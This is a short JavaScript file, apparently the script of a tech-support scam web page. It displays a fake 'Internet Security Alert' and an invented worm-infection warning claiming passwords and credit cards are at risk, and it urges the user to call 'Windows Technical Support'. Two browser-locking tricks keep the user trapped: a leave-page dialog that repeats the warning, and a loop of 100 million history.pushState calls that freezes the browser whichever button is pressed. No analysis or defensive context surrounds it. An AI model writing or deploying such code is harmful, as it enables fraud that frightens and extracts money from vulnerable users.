/**
 * Created by anvo0916 on 25.08.2017.
 */

var text = '*************************************************\nInternet Security Alert! Code: 055BCCAC9FEC\n ************************************************* \n\nInternet Security Alert: Your Computer Might Be Infected By Harmful Viruses \nPlease Do Not Shut Down or Reset Your Computer.\n\nThe following data might be compromised if you continue:\n1. Passwords\n2. Browser History\n3. Credit Card Information\n4. Local Hard Disk Files\n\nThese viruses are well known for identity and credit card theft. Further action on this computer or any other device on your network might reveal private information and involve serious risks.\n\n Call Windows Technical Support:  (Toll Free)';

function main(messageBody) {
    var wormName =  '*************************************************\n' +
        'RDN/YahLover.worm!055BCCAC9FEC Infection\n' +
        '*************************************************\n\n';
    window.onbeforeunload = function(event) {
        var dialogText = wormName + messageBody;
        event.returnValue = dialogText;
        return dialogText;
    };
    window.onload = function() {
        if (confirm(wormName + messageBody)) {
            var url = '';
            for (var i = 0; i < 100000000; i++) {
                url = url + i.toString();
                history.pushState(0, 0, url);
            }
        } else {
            var url = '';
            for (var i = 0; i < 100000000; i++) {
                url = url + i.toString();
                history.pushState(0, 0, url);
            }
        }
    };
}

main(text);